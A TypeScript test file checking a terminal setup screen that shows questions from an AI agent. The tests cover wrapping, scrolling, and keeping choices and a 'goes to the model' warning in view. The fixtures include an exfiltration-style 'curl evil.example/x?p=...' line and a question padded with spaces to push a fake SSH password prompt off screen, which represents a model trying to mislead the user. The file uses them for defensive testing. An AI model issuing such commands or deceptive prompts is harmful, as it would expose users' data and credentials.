// The setup screen's pager: a question too long for its panel is read whole before its choices appear, a wide word
// wraps without clipping, and the transcript scrolls.
import { expect, test } from "bun:test"
import { until } from "../fixture/until"
import { bootSetup, FakeChild } from "./boot"

/** PageDown, PageUp, End, Home as the terminal sends them. */
const PAGE_DOWN = "\u001b[6~"
const PAGE_UP = "\u001b[5~"
const END = "\u001b[F"
const HOME = "\u001b[H"

test("a word wider than the screen wraps and nothing is clipped off its end", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq")
  try {
    const long = "The agent asks: curl evil.example/x?p=" + "A".repeat(94 * 24) + ";SENTINEL_TAIL"
    child.push({ type: "choose", question: long, options: ["login1", "login2"], default: "" })
    // The wide word wraps; its tail is below the first screen but reachable, never cut.
    const first = await app.until((f) => f.includes("evil.example"))
    expect(first).not.toContain("SENTINEL_TAIL")
    app.input.pressKey(END)
    const f = await app.until((f) => f.includes("SENTINEL_TAIL"))
    expect(f).toContain("❯ login1")
  } finally {
    await app.stop()
  }
})

test("a long agent question keeps the answer box and the 'goes to the model' line on screen", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child)
  const toModel = "Your answer goes to the model. Type passwords, passphrases and codes only at ssh's own prompts, never here."
  try {
    child.push({ type: "say", text: toModel })
    // A padded question, as a model might send to push the box off; its spaces collapse to a marker.
    child.push({ type: "ask", question: "The agent asks: ok" + " ".repeat(4000) + "(user@login1) Password:", default: "" })
    const f = await app.until((f) => f.includes("Type your answer here"))
    expect(f).toContain("The agent asks: ok")
    expect(f).toContain("<4000 spaces>")
    // Both the input and the warning line are visible, not pushed off or cut.
    expect(f).toContain("Type your answer here")
    expect(f).toContain("answer goes to the model")
  } finally {
    await app.stop()
  }
})

test("a long prose question scrolls, and the input stays visible below it", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child)
  try {
    const long = "The agent asks: " + Array.from({ length: 60 }, (_, i) => `detail-${i}`).join(" ")
    child.push({ type: "ask", question: long, default: "" })
    const f = await app.until((f) => f.includes("Type your answer here"))
    expect(f).toContain("detail-0")
    // The question is capped, so the input is on screen.
    expect(f).toContain("Type your answer here")
  } finally {
    await app.stop()
  }
})

test("the transcript scrolls with Home, End and the page keys, and shows where it is", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child)
  try {
    for (let i = 0; i < 40; i++) child.push({ type: "say", text: `line-${i}` })
    // Sticky to the bottom: the latest line shows, the first is scrolled off.
    let f = await app.until((f) => f.includes("line-39"))
    expect(f).not.toContain("line-0 ")
    expect(f).toMatch(/lines \d+–\d+ of \d+/)
    // Home brings the first line back.
    app.input.pressKey(HOME)
    f = await app.until((f) => f.includes("line-0"))
    expect(f).toContain("line-0")
    // End returns to the newest.
    app.input.pressKey(END)
    await app.until((f) => f.includes("line-39"))
    // PageUp moves off the bottom again.
    app.input.pressKey(PAGE_UP)
    await app.until((f) => !f.includes("line-39"))
  } finally {
    await app.stop()
  }
})

/** `n` letters cycling a–z, so a dropped character shows as a gap in the sequence. */
const letters = (n: number) => Array.from({ length: n }, (_, i) => String.fromCharCode(97 + (i % 26))).join("")

test.each([80, 100, 61])("every character of a long word is drawn when it wraps, at %i columns", async (width) => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width, height: 30 })
  try {
    const body = "echo" + letters(1000) + "END"
    child.push({ type: "choose", question: `The agent asks: ${body}`, options: ["login1", "login2"], default: "" })
    const f = await app.until((f) => f.includes("login2"))
    // The rows follow each other in the frame, so with the blanks taken out the whole word reads straight through.
    expect(f.replace(/\s+/g, "")).toContain(body)
  } finally {
    await app.stop()
  }
})

test("wide characters wrap by the cells they take, and none is clipped", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width: 80, height: 30 })
  try {
    child.push({ type: "choose", question: "审".repeat(300) + "尾", options: ["login1", "login2"], default: "" })
    const f = await app.until((f) => f.includes("login2"))
    expect(f.split("审").length - 1).toBe(300)
    expect(f).toContain("尾")
  } finally {
    await app.stop()
  }
})

/** About 1100 characters of prose: a long question at 100 columns that the pager shows whole at 100x30, ending in
 *  `QUESTION-END`. */
const MEDIUM = `The agent asks: ${Array.from({ length: 150 }, (_, i) => `word${i}`).join(" ")} QUESTION-END`

test("a resize that makes a read question longer hides its choices until the new end is read", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq")
  try {
    child.push({ type: "choose", question: MEDIUM, options: ["login1", "login2"], default: "" })
    let f = await app.until((f) => f.includes("❯ login1"))
    expect(f).toContain("QUESTION-END")
    expect(f).not.toContain("Read to the end")
    // Narrower, it takes twice the rows: it no longer fits, and its new end hasn't been read.
    app.setup.resize(50, 30)
    f = await app.until((f) => f.includes("Read to the end"))
    expect(f).not.toContain("login1")
    app.input.pressKey(END)
    f = await app.until((f) => f.includes("❯ login1"))
    expect(f).toContain("QUESTION-END")
  } finally {
    await app.stop()
  }
})

const TO_MODEL =
  "Your answer goes to the model. Type passwords, passphrases and codes only at ssh's own prompts, never here."
/** About 4000 characters of prose with single spaces, so no marker shortens it, ending in `QUESTION-END`. */
const PROSE = `The agent asks: ${Array.from({ length: 500 }, (_, i) => `word${i}`).join(" ")} QUESTION-END`

test("at 80x24 a long question with options scrolls, keeps 'goes to the model' in view, and gates its options", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width: 80, height: 24 })
  try {
    child.push({ type: "say", text: TO_MODEL })
    child.push({ type: "choose", question: PROSE, options: ["login1", "login2"], default: "", typed: true })
    // Its start, the whole warning, and the read-on hint; not its end, and not its options yet.
    let f = await app.until((f) => f.includes("Read to the end"))
    expect(f).toContain("The agent asks: word0")
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
    expect(f).not.toContain("QUESTION-END")
    expect(f).not.toContain("login1")
    // The page keys scroll the question; the warning stays put.
    app.input.pressKey(PAGE_DOWN)
    f = await app.until((f) => !f.includes("word0 "))
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
    app.input.pressKey(END)
    f = await app.until((f) => f.includes("QUESTION-END") && f.includes("login2"))
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
    // A single digit never picks.
    app.input.pressKey("1")
    await Bun.sleep(60)
    expect(child.answers).toEqual([])
    // Down then Enter picks the second option.
    app.input.pressArrow("down")
    app.input.pressEnter()
    await until(() => child.answers.length === 1)
    expect(child.answers).toEqual(["login2"])
  } finally {
    await app.stop()
  }
})

test("a long question with options takes a typed answer once it is read", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width: 80, height: 24 })
  try {
    child.push({ type: "say", text: TO_MODEL })
    child.push({ type: "choose", question: PROSE, options: ["login1", "login2"], default: "", typed: true })
    await app.until((f) => f.includes("Read to the end"))
    app.input.pressKey(END)
    await app.until((f) => f.includes("Type my own answer"))
    app.input.pressArrow("down")
    app.input.pressArrow("down")
    app.input.pressEnter()
    await app.until((f) => f.includes("Type your answer here"))
    await app.input.typeText("login7")
    app.input.pressEnter()
    await until(() => child.answers.length === 1)
    expect(child.answers).toEqual(["login7"])
  } finally {
    await app.stop()
  }
})

test("a long text question scrolls with the page keys, its answer line and the warning always in view", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width: 80, height: 24 })
  try {
    child.push({ type: "say", text: TO_MODEL })
    child.push({ type: "ask", question: PROSE, default: "" })
    let f = await app.until((f) => f.includes("Type your answer here"))
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
    expect(f).not.toContain("QUESTION-END")
    app.input.pressKey(END)
    f = await app.until((f) => f.includes("QUESTION-END"))
    expect(f).toContain("Type your answer here")
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
    await app.input.typeText("node1")
    app.input.pressEnter()
    await until(() => child.answers.length === 1)
    expect(child.answers).toEqual(["node1"])
  } finally {
    await app.stop()
  }
})

test("at 80x24 a short question with several options still leaves 'goes to the model' whole", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq", { width: 80, height: 24 })
  try {
    child.push({ type: "say", text: TO_MODEL })
    child.push({
      type: "choose",
      question: "The agent asks: which login node do you use, and is it the one your cluster's docs name?",
      options: ["login1", "login2", "login3", "login4", "login5"],
      default: "",
      typed: true,
    })
    const f = await app.until((f) => f.includes("login5"))
    expect(f.replace(/\s+/g, " ")).toContain(TO_MODEL)
  } finally {
    await app.stop()
  }
})

test("a short question's box is only as tall as the question, leaving the transcript its room", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child)
  try {
    for (let i = 0; i < 22; i++) child.push({ type: "say", text: `line-${i}` })
    child.push({ type: "ask", question: "Company", default: "" })
    const f = await app.until((f) => f.includes("Type your answer here"))
    // A box a third of the screen tall would leave only the last dozen lines.
    expect(f).toContain("line-8 ")
    expect(f).toContain("line-21")
  } finally {
    await app.stop()
  }
})

test("a question's indentation up to 16 spaces is drawn as is; deeper indentation and runs inside it are marked", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child)
  try {
    child.push({ type: "ask", question: "        indented question", default: "" })
    let f = await app.until((f) => f.includes("indented question"))
    expect(f).toContain("        indented question")
    expect(f).not.toContain("<8 spaces>")
    child.answers.length = 0
    app.input.pressEnter()
    await until(() => child.answers.length === 1)
    child.push({ type: "ask", question: " ".repeat(17) + "deep;" + "\t" + "x", default: "" })
    f = await app.until((f) => f.includes("deep;"))
    expect(f).toContain("<17 spaces>deep;<TAB>x")
  } finally {
    await app.stop()
  }
})

test("a window below the minimum hides every choice and says to make it larger; back, the question is gated again", async () => {
  const child = new FakeChild()
  const app = await bootSetup(child, "opencorp hq")
  try {
    child.push({ type: "choose", question: PROSE, options: ["login1", "login2"], default: "" })
    await app.until((f) => f.includes("Read to the end"))
    app.input.pressKey(END)
    await app.until((f) => f.includes("❯ login1"))
    app.setup.resize(100, 8)
    let f = await app.until((f) => f.includes("Make the window larger"))
    expect(f).not.toContain("login1")
    // No key reaches a choice meanwhile.
    app.input.pressEnter()
    await Bun.sleep(60)
    expect(child.answers).toEqual([])
    app.setup.resize(100, 30)
    f = await app.until((f) => f.includes("Read to the end"))
    expect(f).not.toContain("login1")
    app.input.pressKey(END)
    await app.until((f) => f.includes("❯ login1"))
  } finally {
    await app.stop()
  }
})
